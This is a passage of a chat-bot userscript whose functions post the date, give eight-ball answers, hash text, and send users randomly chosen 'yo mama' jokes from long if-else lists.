            var year = currentDate.getFullYear()    //yyyy
            var hr = currentDate.getHours()         //hh
            var min = currentDate.getMinutes()      //mm
            var sec = currentDate.getSeconds()      //ss
            sendPC( botresponename+":  Date: |" + day + "|" + month + "|" + year + "| Time |" + hr + ":" + min + ":" + sec +"|",devid1 );
            }
            function eightBall(argu)
            {
                    var randomNumber = Math.floor( Math.random() * 4 ) + 1;
                    if( randomNumber == 1 ) sendMessage(  botresponename+":  [ "+ argu +"] Most likely." );
                    else if( randomNumber == 2 ) sendMessage( botresponename+":  [ "+ argu +"]  Yes." );
                    else if( randomNumber == 3 ) sendMessage( botresponename+":  [ "+ argu +"]  No." );
                    else if( randomNumber == 4 ) sendMessage( botresponename+":  [ "+ argu +"]  Not likely." );
                }
                function eightBallRig(argu)
                {
                    var randomNumber = Math.floor( Math.random() * 4 ) + 1;
                    if( randomNumber == 1 ) sendMessage(  botresponename+":  [ "+ argu +"] Most likely master." );
                    else if( randomNumber == 2 ) sendMessage( botresponename+":  [ "+ argu +"]  Yes master." );
                    else if( randomNumber == 3 ) sendMessage( botresponename+":  [ "+ argu +"]  Definitely master." );
                    else if( randomNumber == 4 ) sendMessage( botresponename+":  [ "+ argu +"]  It is certain master." );
                }
                function crypto( arg, alg ) //encryption..
                {
                setTimeout( function() // unsafeWindow cannot call GM_cryptoHash()
                {
                        var hashed = GM_cryptoHash( arg, alg );
                        if( alg == "SHA512" ) setTimeout( function() { sendMessage( hashed ); }, 1750 );
                        else if( alg == "SHA384" || alg == "SHA256" ) setTimeout( function() { sendMessage(hashed ); }, 1500 );
                        else setTimeout( function() { sendMessage( hashed ); }, 1000 );
                }, 1);
                       }
                       function insult( argu ) //I should of used var insult= [...] but I'm too lazy, by Twin, for some annoying people.
                        {
                        var randomNumber = Math.floor( Math.random() * 172 ) + 1;
                        if( randomNumber == 1) sendMessage( argu+",Yo mama`s so fat, I had to take a train and two buses just to get on her good side.");
                        else if( randomNumber == 2) sendMessage( argu+",Yo mama`s so fat, people jog around her for exercise.");
                        else if( randomNumber == 3) sendMessage( argu+",Yo mama`s so fat, when she wears high heels, she strikes oil.");
                        else if( randomNumber == 4) sendMessage( argu+",Yo mama`s so fat, her blood type is Ragu.");
                        else if( randomNumber == 5) sendMessage( argu+",Yo mama`s so fat, her picture fell off the wall.");
                        else if( randomNumber == 6) sendMessage( argu+",Yo mama`s so fat, her college graduation picture was an aerial.");
                        else if( randomNumber == 7) sendMessage( argu+",Yo mama`s so fat, she looks like she`s smuggling a Volkswagen.");
                        else if( randomNumber == 8) sendMessage( argu+",Yo mama`s so fat, she goes to a restaurant, looks at the menu, and says ``Okay.``");
                        else if( randomNumber == 9) sendMessage( argu+",Yo mama`s so fat, she even orders, ``Thank you, come again.``");
                        else if( randomNumber == 10) sendMessage( argu+",Yo mama`s so fat, when she brought her dress to the cleaners, they said ``Sorry, we don`t do curtains.``");
                        else if( randomNumber == 11) sendMessage( argu+",Yo mama`s so fat, when she turns around, people throw her a welcome back party.");
                        else if( randomNumber == 12) sendMessage( argu+",Yo mama`s so fat, she can`t even jump to a conclusion.");
                        else if( randomNumber == 13) sendMessage( argu+",Yo mama`s so fat, when she talks to herself, it`s a long distance call.");
                        else if( randomNumber == 14) sendMessage( argu+",Yo mama`s so fat, if she weighed five more pounds, she could get group insurance.");
                        else if( randomNumber == 15) sendMessage( argu+",Yo mama`s so fat, she broke her leg and gravy poured out.");
                        else if( randomNumber == 16) sendMessage( argu+",Yo mama`s so fat, when she takes a shower, her feet don`t get wet.");
                        else if( randomNumber == 17) sendMessage( argu+",Yo mama`s so fat, the post office gave her 2 zip codes.");
                        else if( randomNumber == 18) sendMessage( argu+",Yo mama`s so fat, she was floating in the ocean and Spain claimed her as a new world.");
                        else if( randomNumber == 19) sendMessage( argu+",Yo mama`s so fat, she went to the movies and sat next to everyone.");
                        else if( randomNumber == 20) sendMessage( argu+",Yo mama`s so fat, she has to iron her pants on the driveway.");
                        else if( randomNumber == 21) sendMessage( argu+",Yo mama`s so fat, she fell in love and broke it.");
                        else if( randomNumber == 22) sendMessage( argu+",Yo mama`s so fat, she gets clothes in three sizes: extra large, jumbo, and oh-no-it`s-coming-toward-us!");
                        else if( randomNumber == 23) sendMessage( argu+",Yo mama`s so fat, she has to grease her hands to get into her pockets.");
                        else if( randomNumber == 24) sendMessage( argu+",Yo mama`s so fat, her shadow weighs 2 pounds.");
                        else if( randomNumber == 25) sendMessage( argu+",Yo mama`s so fat, she jumped up in the air and got stuck.");
                        else if( randomNumber == 26) sendMessage( argu+",Yo mama`s so fat, she puts on her lipstick with a paint-roller.");
                        else if( randomNumber == 27) sendMessage( argu+",Yo mama`s so fat, she sat on the corner and the police came and said, ``Hey, break it up.``");
                        else if( randomNumber == 28) sendMessage( argu+",Yo mama`s so fat, she stood in front of the Hollywood sign and it just said H d.");
                        else if( randomNumber == 29) sendMessage( argu+",Yo mama`s so fat, she went to get a tan and the sun burned out.");
                        else if( randomNumber == 30) sendMessage( argu+",Yo mama`s so fat, she wears a VCR for a beeper.");
                        else if( randomNumber == 31) sendMessage( argu+",Yo mama`s so fat, she`s on both sides of the family.");
                        else if( randomNumber == 32) sendMessage( argu+",Yo mama`s so fat, when she goes on a picnic in the mountains, bears hide their food.");
                        else if( randomNumber == 33) sendMessage( argu+",Yo mama`s so fat, I swerved to avoid her in the road and ran out of gas.");
                        else if( randomNumber == 34) sendMessage( argu+",Yo mama`s so fat, she has to take a bath at Sea World.");
                        else if( randomNumber == 35) sendMessage( argu+",Yo mama`s so fat, when she back up, she beep. [sic]");
                        else if( randomNumber == 36) sendMessage( argu+",Yo mama`s so fat, they had to grease a door frame and hold a Twinkie on the other side to get her through.");
                        else if( randomNumber == 37) sendMessage( argu+",Yo mama`s so fat, her navel gets home 10 minutes before she does.");
                        else if( randomNumber == 38) sendMessage( argu+",Yo mama`s so fat, she`s taller lying down than standing up.");
                        else if( randomNumber == 39) sendMessage( argu+",Yo mama`s so fat, when she fell over she rocked herself asleep trying to get back up.");
                        else if( randomNumber == 40) sendMessage( argu+",Yo mama`s so fat, when she puts her hand on her hip, she looks like a gallon of milk.");
                        else if( randomNumber == 41) sendMessage( argu+",Yo mama`s so fat, they had to install speed bumps at the all-u-can-eat buffet.");
                        else if( randomNumber == 42) sendMessage( argu+",Yo mama`s so fat, when she steps on a scale, it says, ``One at a time, please.``");
                        else if( randomNumber == 43) sendMessage( argu+",Yo mama`s so fat, when she steps on a scale, it says, ``To be continued....``");
                        else if( randomNumber == 44) sendMessage( argu+",Yo mama`s so fat, when she steps on a scale, it says, ``Please step out of the car.``");
                        else if( randomNumber == 45) sendMessage( argu+",Yo mama`s so fat, when she wears a red dress, kids yell ``Kool-Aid!``");
                        else if( randomNumber == 46) sendMessage( argu+",Yo mama`s so fat, when she wears a yellow raincoat, people call her ``Taxi!``");
                        else if( randomNumber == 47) sendMessage( argu+",Yo mama`s so fat, when she went to the beach, Greenpeace tried to drag her back into the ocean.");
                        else if( randomNumber == 48) sendMessage( argu+",Yo mama`s so fat, when she walks across the room, she`s gotta make two trips.");
                        else if( randomNumber == 49) sendMessage( argu+",Yo mama`s so fat, when she goes to the beach, no one else gets a tan.");
                        else if( randomNumber == 50) sendMessage( argu+",Yo mama`s so fat, her belly button`s got an echo.");
                        else if( randomNumber == 51) sendMessage( argu+",Yo mama`s so fat, she uses Route 66 for a Slip`n`Slide.");
                        else if( randomNumber == 52) sendMessage( argu+",Yo mama`s so fat, they had to change ``One size fits all`` to ``One size fits most.``");
                        else if( randomNumber == 53) sendMessage( argu+",Yo mama`s so fat, you have to take three steps to see all of her.");
                        else if( randomNumber == 54) sendMessage( argu+",Yo mama`s so fat, she made Weight Watchers go blind.");
                        else if( randomNumber == 55) sendMessage( argu+",Yo mama`s so stupid, she spent twenty minutes looking at an orange juice box because it said ``concentrate.``");
                        else if( randomNumber == 56) sendMessage( argu+",Yo mama`s so stupid, she put lipstick on her forehead because she wanted to make up her mind.");
                        else if( randomNumber == 57) sendMessage( argu+",Yo mama`s so stupid, they had to burn the school down to get her out of the 3rd grade.");
                        else if( randomNumber == 58) sendMessage( argu+",Yo mama`s so stupid, she sat in a tree house because she wanted to be a branch manager.");
                        else if( randomNumber == 59) sendMessage( argu+",Yo mama`s so stupid, she stole a police car because she thought ``911`` meant Porsche.");
                        else if( randomNumber == 60) sendMessage( argu+",Yo mama`s so stupid, she sat on the TV & watched the couch.");
                        else if( randomNumber == 61) sendMessage( argu+",Yo mama`s so stupid, when she was taking you to the airport and a sign said ``Airport Left,`` she turned around and went home.");
                        else if( randomNumber == 62) sendMessage( argu+",Yo mama`s so stupid, she put a ruler by her pillow to see how long she slept.");
                        else if( randomNumber == 63) sendMessage( argu+",Yo mama`s so stupid, she was locked in a grocery store and starved.");
                        else if( randomNumber == 64) sendMessage( argu+",Yo mama`s so stupid, your house burned down because she couldn`t find the ``11`` button to call 911.");
                        else if( randomNumber == 65) sendMessage( argu+",Yo mama`s so stupid, she brought a spoon to the Super Bowl.");
                        else if( randomNumber == 66) sendMessage( argu+",Yo mama`s so stupid, she brought a towel to her carpool.");
                        else if( randomNumber == 67) sendMessage( argu+",Yo mama`s so stupid, she thought a quarterback was a refund.");
                        else if( randomNumber == 68) sendMessage( argu+",Yo mama`s so stupid, she thought a lawsuit was something you wear to court.");
                        else if( randomNumber == 69) sendMessage( argu+",Yo mama`s so stupid, she took the Pepsi challenge and chose Jif.");
                        else if( randomNumber == 70) sendMessage( argu+",Yo mama`s so stupid, she stole free bread.");
                        else if( randomNumber == 71) sendMessage( argu+",Yo mama`s so stupid, she got tangled up in a cordless phone.");
                        else if( randomNumber == 72) sendMessage( argu+",Yo mama`s so stupid, it takes her 2 hours to watch 60 Minutes.");
                        else if( randomNumber == 73) sendMessage( argu+",Yo mama`s so stupid, if she spoke her mind, she`d be speechless.");
                        else if( randomNumber == 74) sendMessage( argu+",Yo mama`s so stupid, she jumped out the window and went up.");
                        else if( randomNumber == 75) sendMessage( argu+",Yo mama`s so stupid, she failed a blood test.");
                        else if( randomNumber == 76) sendMessage( argu+",Yo mama`s so stupid, she thought hamburger helper came with another person.");
                        else if( randomNumber == 77) sendMessage( argu+",Yo mama`s so stupid, if you gave her a penny for her thoughts, you`d get change back.");
                        else if( randomNumber == 78) sendMessage( argu+",Yo mama`s so stupid, she got hit by a parked car.");
                        else if( randomNumber == 79) sendMessage( argu+",Yo mama`s so stupid, she sold the car for gas money.");
                        else if( randomNumber == 80) sendMessage( argu+",Yo mama`s so stupid, when your dad said, ``It`s chilly outside,`` she ran into the kitchen to get a bowl.");
                        else if( randomNumber == 81) sendMessage( argu+",Yo mama`s so stupid, she thinks Taco Bell is the Mexican phone company.");
                        else if( randomNumber == 82) sendMessage( argu+",Yo mama`s so stupid, she got fired from the M&M`s factory for throwing away all the W`s.");
                        else if( randomNumber == 83) sendMessage( argu+",Yo mama`s so stupid, she heard that 90% of all accidents occur around the home, so she moved.");
                        else if( randomNumber == 84) sendMessage( argu+",Yo mama`s so ugly, when she joined an ugly contest, they said, ``Sorry, no professionals.``");
                        else if( randomNumber == 85) sendMessage( argu+",Yo mama`s so ugly, her face is closed on weekends.");
                        else if( randomNumber == 86) sendMessage( argu+",Yo mama`s so ugly, when she gets up, the sun goes down.");
                        else if( randomNumber == 87) sendMessage( argu+",Yo mama`s so ugly, she has to sneak up on bath water.");
                        else if( randomNumber == 88) sendMessage( argu+",Yo mama`s so ugly, her picture is on the inside of a Roach Motel.");
                        else if( randomNumber == 89) sendMessage( argu+",Yo mama`s so ugly, she`d make a train take a dirt road.");
                        else if( randomNumber == 90) sendMessage( argu+",Yo mama`s so ugly, instead of having her own 900 number, she has her own 911 number.");
                        else if( randomNumber == 91) sendMessage( argu+",Yo mama`s so ugly, when I took her to a haunted house, she came out with a paycheck.");
                        else if( randomNumber == 92) sendMessage( argu+",Yo mama`s so ugly, when I took her to the zoo, the guy at the door said, ``Thanks for bringing her back.``");
                        else if( randomNumber == 93) sendMessage( argu+",Yo mama`s so ugly, people go as her for Halloween.");
                        else if( randomNumber == 94) sendMessage( argu+",Yo mama`s so ugly, she has to trick or treat over the phone.");
                        else if( randomNumber == 95) sendMessage( argu+",Yo mama`s so ugly, the government moved Halloween to her birthday.");
                        else if( randomNumber == 96) sendMessage( argu+",Yo mama`s so ugly, she makes onions cry.");
                        else if( randomNumber == 97) sendMessage( argu+",Yo mama`s so ugly, she scares away blind kids.");
                        else if( randomNumber == 98) sendMessage( argu+",Yo mama`s so ugly, she threw a boomerang and it wouldn`t come back.");
                        else if( randomNumber == 99) sendMessage( argu+",Yo mama`s so ugly, when she was born, the doctor slapped her mama.");
                        else if( randomNumber == 100) sendMessage( argu+",Yo mama`s so ugly, the doctor`s still slapping her.");
                        else if( randomNumber == 101) sendMessage( argu+",Yo mama`s so ugly, when she leaned over to hear, ``snap, crackle, pop,`` all she heard was ``Aargh! Get us out of here!``");
                        else if( randomNumber == 102) sendMessage( argu+",Yo mama`s so ugly, the psychiatrist makes her lie face down.");
                        else if( randomNumber == 103) sendMessage( argu+",Yo mama`s so ugly, they didn`t give her a costume when she tried out for Star Wars.");
                        else if( randomNumber == 104) sendMessage( argu+",Yo mama`s so ugly, when she passes by a bathroom all the toilets flush.");
                        else if( randomNumber == 105) sendMessage( argu+",Yo mama`s so ugly, when she walks in the kitchen, the rats jump on the table and start screaming.");
                        else if( randomNumber == 106) sendMessage( argu+",Yo mama`s so ugly, when she walks into a bank, they turn off the cameras.");
                        else if( randomNumber == 107) sendMessage( argu+",Yo mama`s so ugly, her parents fed her with a slingshot.");
                        else if( randomNumber == 108) sendMessage( argu+",Yo mama`s so old, her birth certificate expired.");
                        else if( randomNumber == 109) sendMessage( argu+",Yo mama`s so old, I told her to act her age and she died.");
                        else if( randomNumber == 110) sendMessage( argu+",Yo mama`s so old, her social security number is 23.");
                        else if( randomNumber == 111) sendMessage( argu+",Yo mama`s so old, when she was in school there was no history class.");
                        else if( randomNumber == 112) sendMessage( argu+",Yo mama`s so old, Moses is in her high school yearbook.");
                        else if( randomNumber == 113) sendMessage( argu+",Yo mama`s so old, she knew Burger King while he was still a prince.");
                        else if( randomNumber == 114) sendMessage( argu+",Yo mama`s so poor, when I ring the doorbell she says ``Ding!``");
                        else if( randomNumber == 115) sendMessage( argu+",Yo mama`s so poor, when I saw her kicking a can down the street and asked her what she was doing, she said, ``Moving.``");
                        else if( randomNumber == 116) sendMessage( argu+",Yo mama`s so poor, she has to eat a large pizza outside.");
                        else if( randomNumber == 117) sendMessage( argu+",Yo mama`s so poor, she has to go outside to change her mind.");
                        else if( randomNumber == 118) sendMessage( argu+",Yo mama`s so poor, she dropped a kleenex and got wall-to-wall carpeting.");
                        else if( randomNumber == 119) sendMessage( argu+",Yo mama`s so poor, she went to McDonald`s and put a milkshake on layaway.");
                        else if( randomNumber == 120) sendMessage( argu+",Yo mama`s so poor, your TV has 2 channels: ``on`` and ``off.``");
                        else if( randomNumber == 121) sendMessage( argu+",Yo mama`s so poor, they put her picture on the food stamp.");
                        else if( randomNumber == 122) sendMessage( argu+",Yo mama`s so poor, she can`t even afford to pay attention.");
                        else if( randomNumber == 123) sendMessage( argu+",Yo mama`s so short, she poses for trophies.");
                        else if( randomNumber == 124) sendMessage( argu+",Yo mama`s so short, she can do backflips under the bed.");
                        else if( randomNumber == 125) sendMessage( argu+",Yo mama`s so short, she needs a ladder to pick up a dime.");
                        else if( randomNumber == 126) sendMessage( argu+",Yo mama`s so short, you can see her feet on her driver`s license picture.");
                        else if( randomNumber == 127) sendMessage( argu+",Yo mama`s so skinny, she turned sideways and disappeared.");
                        else if( randomNumber == 128) sendMessage( argu+",Yo mama`s so skinny, she got her ear pierced and died.");
                        else if( randomNumber == 129) sendMessage( argu+",Yo mama`s so skinny, she has to wear a belt with spandex.");
                        else if( randomNumber == 130) sendMessage( argu+",Yo mama smells so bad, she made Speed Stick slow down.");
                        else if( randomNumber == 131) sendMessage( argu+",Yo mama smells so bad, she made Right Guard turn left.");
                        else if( randomNumber == 132) sendMessage( argu+",Yo mama smells so bad, Secret told on her.");
                        else if( randomNumber == 133) sendMessage( argu+",Yo mama smells so bad, Sure is confused.");
                        else if( randomNumber == 134) sendMessage( argu+",Yo mama`s so bald, her hair looks like stitches.");
                        else if( randomNumber == 135) sendMessage( argu+",Yo mama`s so bald, she uses rice for curlers.");
                        else if( randomNumber == 136) sendMessage( argu+",Yo mama`s so bald, when she showers she gets brainwashed.");
                        else if( randomNumber == 137) sendMessage( argu+",Yo mama`s so bald, I can see what`s on her mind.");
                        else if( randomNumber == 138) sendMessage( argu+",Yo mama`s so bald, a wig doesn`t help.");
                        else if( randomNumber == 139) sendMessage( argu+",Yo mama`s got a wooden leg with a kickstand.");
                        else if( randomNumber == 140) sendMessage( argu+",Yo mama`s got a wooden leg with branches.");
                        else if( randomNumber == 141) sendMessage( argu+",Yo mama`s got a wooden leg with a real foot.");
                        else if( randomNumber == 142) sendMessage( argu+",Yo mama`s got two wooden legsYo mama`s got  and one is backward.");
                        else if( randomNumber == 143) sendMessage( argu+",Yo mama`s got a glass leg full of Kool-aid.");
                        else if( randomNumber == 144) sendMessage( argu+",Yo mama`s got an afro with a chin strap.");
                        else if( randomNumber == 145) sendMessage( argu+",Yo mama`s got a $4 weave and don`t know when to leave.");
                        else if( randomNumber == 146) sendMessage( argu+",Yo mama`s got a bald head with a part and sideburns.");
                        else if( randomNumber == 147) sendMessage( argu+",Yo mama`s got a metal afro with rusty sideburns.");
                        else if( randomNumber == 148) sendMessage( argu+",Yo mama`s got a wooden afro with an ``x`` carved in the back.");
                        else if( randomNumber == 149) sendMessage( argu+",Yo mama`s got green hair and thinks she`s a tree.");
                        else if( randomNumber == 150) sendMessage( argu+",Yo mama`s got a wooden head.");
                        else if( randomNumber == 151) sendMessage( argu+",Yo mama`s got a leather wig with suede sideburns.");
                        else if( randomNumber == 152) sendMessage( argu+",Yo mama`s got more weave than a dog in traffic.");
                        else if( randomNumber == 153) sendMessage( argu+",Yo mama`s got snakeskin teeth.");
                        else if( randomNumber == 154) sendMessage( argu+",Yo mama`s got so many gaps in her teeth it looks like piano keys.");
                        else if( randomNumber == 155) sendMessage( argu+",Yo mama`s got teeth so rotten they look like dice.");
                        else if( randomNumber == 156) sendMessage( argu+",Yo mama`s got teeth so yellow when she smiles she slows down traffic.");
                        else if( randomNumber == 157) sendMessage( argu+",Yo mama`s got breath so bad when she yawns her teeth duck.");
                        else if( randomNumber == 158) sendMessage( argu+",Yo mama`s got breath so bad people on the phone hang up.");
                        else if( randomNumber == 159) sendMessage( argu+",Yo mama`s got a glass eye with a goldfish in it.");
                        else if( randomNumber == 160) sendMessage( argu+",Yo mama`s got so many rolls of fat she has to screw on her pants.");
                        else if( randomNumber == 161) sendMessage( argu+",Yo mama`s got three teeth, one in her mouth and two in her pocket.");
                        else if( randomNumber == 162) sendMessage( argu+",Yo mama`s got 11 fingers, all on the same hand.");
                        else if( randomNumber == 163) sendMessage( argu+",Yo mama`s got 4 eyes and 2 pairs of sunglasses.");
                        else if( randomNumber == 164) sendMessage( argu+",Yo mama`s got no ears and is trying on sunglasses.");
                        else if( randomNumber == 165) sendMessage( argu+",Yo mama`s got a forehead so big you can show slides on it.");
                        else if( randomNumber == 166) sendMessage( argu+",Yo mama`s got feet so big, her sneakers need license plates.");
                        else if( randomNumber == 167) sendMessage( argu+",Yo mama`s got a mouth so big, she talks in surround sound.");
                        else if( randomNumber == 168) sendMessage( argu+",Yo mama`s got a head so big, it shows up on radar.");
                        else if( randomNumber == 169) sendMessage( argu+",Yo mama`s got a head so big, she don`t have dreams, she has movies.");
                        else if( randomNumber == 170) sendMessage( argu+",Yo mama`s got a head so big, she has to step into her shirt.");
                        else if( randomNumber == 171) sendMessage( argu+",Yo mama`s got such an ugly car, someone broke in just to steal The Club.");
                        else if( randomNumber == 172) sendMessage( argu+",Yo mama`s got one toe and one knee and her name is ``Tony.``");
                        else if( randomNumber == 173) sendMessage( argu+",Yo mama`s got one leg and her name is ``Eileen.``");
                }
                function roaster(argu,argu2) //I should of used var insult= [...] but I'm too lazy, by Twin, for some annoying people.
                        {
                        var randomNumber = Math.floor( Math.random() * 172 ) + 1;
                        if( randomNumber == 1) sendPC(argu+",Yo mama`s so fat, I had to take a train and two buses just to get on her good side.",argu2);
                        else if( randomNumber == 2) sendPC(argu+",Yo mama`s so fat, people jog around her for exercise.",argu2);
                        else if( randomNumber == 3) sendPC(argu+",Yo mama`s so fat, when she wears high heels, she strikes oil.",argu2);
                        else if( randomNumber == 4) sendPC(argu+",Yo mama`s so fat, her blood type is Ragu.",argu2);
                        else if( randomNumber == 5) sendPC(argu+",Yo mama`s so fat, her picture fell off the wall.",argu2);
                        else if( randomNumber == 6) sendPC(argu+",Yo mama`s so fat, her college graduation picture was an aerial.",argu2);
                        else if( randomNumber == 7) sendPC(argu+",Yo mama`s so fat, she looks like she`s smuggling a Volkswagen.",argu2);
                        else if( randomNumber == 8) sendPC(argu+",Yo mama`s so fat, she goes to a restaurant, looks at the menu, and says ``Okay.``",argu2);
                        else if( randomNumber == 9) sendPC(argu+",Yo mama`s so fat, she even orders, ``Thank you, come again.``",argu2);
                        else if( randomNumber == 10) sendPC(argu+",Yo mama`s so fat, when she brought her dress to the cleaners, they said ``Sorry, we don`t do curtains.``",argu2);
                        else if( randomNumber == 11) sendPC(argu+",Yo mama`s so fat, when she turns around, people throw her a welcome back party.",argu2);
                        else if( randomNumber == 12) sendPC(argu+",Yo mama`s so fat, she can`t even jump to a conclusion.",argu2);
                        else if( randomNumber == 13) sendPC(argu+",Yo mama`s so fat, when she talks to herself, it`s a long distance call.",argu2);
                        else if( randomNumber == 14) sendPC(argu+",Yo mama`s so fat, if she weighed five more pounds, she could get group insurance.",argu2);
                        else if( randomNumber == 15) sendPC(argu+",Yo mama`s so fat, she broke her leg and gravy poured out.",argu2);
                        else if( randomNumber == 16) sendPC(argu+",Yo mama`s so fat, when she takes a shower, her feet don`t get wet.",argu2);
                        else if( randomNumber == 17) sendPC(argu+",Yo mama`s so fat, the post office gave her 2 zip codes.",argu2);
                        else if( randomNumber == 18) sendPC(argu+",Yo mama`s so fat, she was floating in the ocean and Spain claimed her as a new world.",argu2);
                        else if( randomNumber == 19) sendPC(argu+",Yo mama`s so fat, she went to the movies and sat next to everyone.",argu2);
                        else if( randomNumber == 20) sendPC(argu+",Yo mama`s so fat, she has to iron her pants on the driveway.",argu2);
                        else if( randomNumber == 21) sendPC(argu+",Yo mama`s so fat, she fell in love and broke it.",argu2);
                        else if( randomNumber == 22) sendPC(argu+",Yo mama`s so fat, she gets clothes in three sizes: extra large, jumbo, and oh-no-it`s-coming-toward-us!",argu2);
                        else if( randomNumber == 23) sendPC(argu+",Yo mama`s so fat, she has to grease her hands to get into her pockets.",argu2);
                        else if( randomNumber == 24) sendPC(argu+",Yo mama`s so fat, her shadow weighs 2 pounds.",argu2);
                        else if( randomNumber == 25) sendPC(argu+",Yo mama`s so fat, she jumped up in the air and got stuck.",argu2);
                        else if( randomNumber == 26) sendPC(argu+",Yo mama`s so fat, she puts on her lipstick with a paint-roller.",argu2);
                        else if( randomNumber == 27) sendPC(argu+",Yo mama`s so fat, she sat on the corner and the police came and said, ``Hey, break it up.``",argu2);
                        else if( randomNumber == 28) sendPC(argu+",Yo mama`s so fat, she stood in front of the Hollywood sign and it just said H d.",argu2);
                        else if( randomNumber == 29) sendPC(argu+",Yo mama`s so fat, she went to get a tan and the sun burned out.",argu2);
                        else if( randomNumber == 30) sendPC(argu+",Yo mama`s so fat, she wears a VCR for a beeper.",argu2);
                        else if( randomNumber == 31) sendPC(argu+",Yo mama`s so fat, she`s on both sides of the family.",argu2);
                        else if( randomNumber == 32) sendPC(argu+",Yo mama`s so fat, when she goes on a picnic in the mountains, bears hide their food.",argu2);
                        else if( randomNumber == 33) sendPC(argu+",Yo mama`s so fat, I swerved to avoid her in the road and ran out of gas.",argu2);
                        else if( randomNumber == 34) sendPC(argu+",Yo mama`s so fat, she has to take a bath at Sea World.",argu2);
                        else if( randomNumber == 35) sendPC(argu+",Yo mama`s so fat, when she back up, she beep. [sic]",argu2);
                        else if( randomNumber == 36) sendPC(argu+",Yo mama`s so fat, they had to grease a door frame and hold a Twinkie on the other side to get her through.",argu2);
                        else if( randomNumber == 37) sendPC(argu+",Yo mama`s so fat, her navel gets home 10 minutes before she does.",argu2);
                        else if( randomNumber == 38) sendPC(argu+",Yo mama`s so fat, she`s taller lying down than standing up.",argu2);
                        else if( randomNumber == 39) sendPC(argu+",Yo mama`s so fat, when she fell over she rocked herself asleep trying to get back up.",argu2);
                        else if( randomNumber == 40) sendPC(argu+",Yo mama`s so fat, when she puts her hand on her hip, she looks like a gallon of milk.",argu2);
                        else if( randomNumber == 41) sendPC(argu+",Yo mama`s so fat, they had to install speed bumps at the all-u-can-eat buffet.",argu2);
                        else if( randomNumber == 42) sendPC(argu+",Yo mama`s so fat, when she steps on a scale, it says, ``One at a time, please.``",argu2);
                        else if( randomNumber == 43) sendPC(argu+",Yo mama`s so fat, when she steps on a scale, it says, ``To be continued....``",argu2);
                        else if( randomNumber == 44) sendPC(argu+",Yo mama`s so fat, when she steps on a scale, it says, ``Please step out of the car.``",argu2);
                        else if( randomNumber == 45) sendPC(argu+",Yo mama`s so fat, when she wears a red dress, kids yell ``Kool-Aid!``",argu2);
                        else if( randomNumber == 46) sendPC(argu+",Yo mama`s so fat, when she wears a yellow raincoat, people call her ``Taxi!``",argu2);
                        else if( randomNumber == 47) sendPC(argu+",Yo mama`s so fat, when she went to the beach, Greenpeace tried to drag her back into the ocean.",argu2);
                        else if( randomNumber == 48) sendPC(argu+",Yo mama`s so fat, when she walks across the room, she`s gotta make two trips.",argu2);
                        else if( randomNumber == 49) sendPC(argu+",Yo mama`s so fat, when she goes to the beach, no one else gets a tan.",argu2);
                        else if( randomNumber == 50) sendPC(argu+",Yo mama`s so fat, her belly button`s got an echo.",argu2);
                        else if( randomNumber == 51) sendPC(argu+",Yo mama`s so fat, she uses Route 66 for a Slip`n`Slide.",argu2);
                        else if( randomNumber == 52) sendPC(argu+",Yo mama`s so fat, they had to change ``One size fits all`` to ``One size fits most.``",argu2);
                        else if( randomNumber == 53) sendPC(argu+",Yo mama`s so fat, you have to take three steps to see all of her.",argu2);
                        else if( randomNumber == 54) sendPC(argu+",Yo mama`s so fat, she made Weight Watchers go blind.",argu2);
                        else if( randomNumber == 55) sendPC(argu+",Yo mama`s so stupid, she spent twenty minutes looking at an orange juice box because it said ``concentrate.``",argu2);
                        else if( randomNumber == 56) sendPC(argu+",Yo mama`s so stupid, she put lipstick on her forehead because she wanted to make up her mind.",argu2);
                        else if( randomNumber == 57) sendPC(argu+",Yo mama`s so stupid, they had to burn the school down to get her out of the 3rd grade.",argu2);
                        else if( randomNumber == 58) sendPC(argu+",Yo mama`s so stupid, she sat in a tree house because she wanted to be a branch manager.",argu2);
                        else if( randomNumber == 59) sendPC(argu+",Yo mama`s so stupid, she stole a police car because she thought ``911`` meant Porsche.",argu2);
                        else if( randomNumber == 60) sendPC(argu+",Yo mama`s so stupid, she sat on the TV & watched the couch.",argu2);
                        else if( randomNumber == 61) sendPC(argu+",Yo mama`s so stupid, when she was taking you to the airport and a sign said ``Airport Left,`` she turned around and went home.",argu2);
                        else if( randomNumber == 62) sendPC(argu+",Yo mama`s so stupid, she put a ruler by her pillow to see how long she slept.",argu2);
                        else if( randomNumber == 63) sendPC(argu+",Yo mama`s so stupid, she was locked in a grocery store and starved.",argu2);
                        else if( randomNumber == 64) sendPC(argu+",Yo mama`s so stupid, your house burned down because she couldn`t find the ``11`` button to call 911.",argu2);
                        else if( randomNumber == 65) sendPC(argu+",Yo mama`s so stupid, she brought a spoon to the Super Bowl.",argu2);
                        else if( randomNumber == 66) sendPC(argu+",Yo mama`s so stupid, she brought a towel to her carpool.",argu2);
                        else if( randomNumber == 67) sendPC(argu+",Yo mama`s so stupid, she thought a quarterback was a refund.",argu2);
                        else if( randomNumber == 68) sendPC(argu+",Yo mama`s so stupid, she thought a lawsuit was something you wear to court.",argu2);
                        else if( randomNumber == 69) sendPC(argu+",Yo mama`s so stupid, she took the Pepsi challenge and chose Jif.",argu2);
                        else if( randomNumber == 70) sendPC(argu+",Yo mama`s so stupid, she stole free bread.",argu2);
                        else if( randomNumber == 71) sendPC(argu+",Yo mama`s so stupid, she got tangled up in a cordless phone.",argu2);
                        else if( randomNumber == 72) sendPC(argu+",Yo mama`s so stupid, it takes her 2 hours to watch 60 Minutes.",argu2);
                        else if( randomNumber == 73) sendPC(argu+",Yo mama`s so stupid, if she spoke her mind, she`d be speechless.",argu2);
                        else if( randomNumber == 74) sendPC(argu+",Yo mama`s so stupid, she jumped out the window and went up.",argu2);
                        else if( randomNumber == 75) sendPC(argu+",Yo mama`s so stupid, she failed a blood test.",argu2);
                        else if( randomNumber == 76) sendPC(argu+",Yo mama`s so stupid, she thought hamburger helper came with another person.",argu2);
                        else if( randomNumber == 77) sendPC(argu+",Yo mama`s so stupid, if you gave her a penny for her thoughts, you`d get change back.",argu2);
                        else if( randomNumber == 78) sendPC(argu+",Yo mama`s so stupid, she got hit by a parked car.",argu2);
                        else if( randomNumber == 79) sendPC(argu+",Yo mama`s so stupid, she sold the car for gas money.",argu2);
                        else if( randomNumber == 80) sendPC(argu+",Yo mama`s so stupid, when your dad said, ``It`s chilly outside,`` she ran into the kitchen to get a bowl.",argu2);
                        else if( randomNumber == 81) sendPC(argu+",Yo mama`s so stupid, she thinks Taco Bell is the Mexican phone company.",argu2);
